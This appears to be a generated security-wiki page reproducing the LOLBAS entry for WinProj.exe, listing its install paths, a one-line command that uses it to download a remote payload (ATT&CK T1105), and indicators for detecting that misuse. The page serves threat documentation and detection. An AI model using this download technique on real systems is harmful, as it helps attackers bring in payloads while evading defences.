---
title: "WinProj.exe"
framework: "lolbas"
generated: "true"
source_path: "yml/OtherMSBinaries/Winproj.yml"
source_url: "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Winproj.yml"
build_date: "2026-04-27 19:14:21"
category: "OtherMSBinaries"
aliases:
  - "WinProj.exe"
functions:
  - "Download"
attack_technique_ids:
  - "T1105"
tags:
  - "lolbas"
  - "living-off-the-land"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Microsoft Project Executable

## Paths

- `C:\Program Files (x86)\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\Office16\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office14\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office15\WinProj.exe`
- `C:\Program Files (x86)\Microsoft Office\root\Office16\WinProj.exe`
- `C:\Program Files\Microsoft Office\root\Office16\WinProj.exe`

## Commands

### 1. Download

Downloads payload from remote server

```cmd
WinProj.exe {REMOTEURL}
```

- Use Case: It will download a remote payload and place it in INetCache.
- Privileges: User
- Operating System: Windows
- ATT&CK: [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105: Ingress Tool Transfer]]

## Detections

- IOC: URL on a WinProj command line
- IOC: WinProj making unexpected network connections or DNS requests

## Acknowledgements

- {'Person': 'Avihay Eldad', 'Handle': '@AvihayEldad'}

## Source

- [LOLBAS project](https://lolbas-project.github.io/)
- [Source YAML](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Winproj.yml)
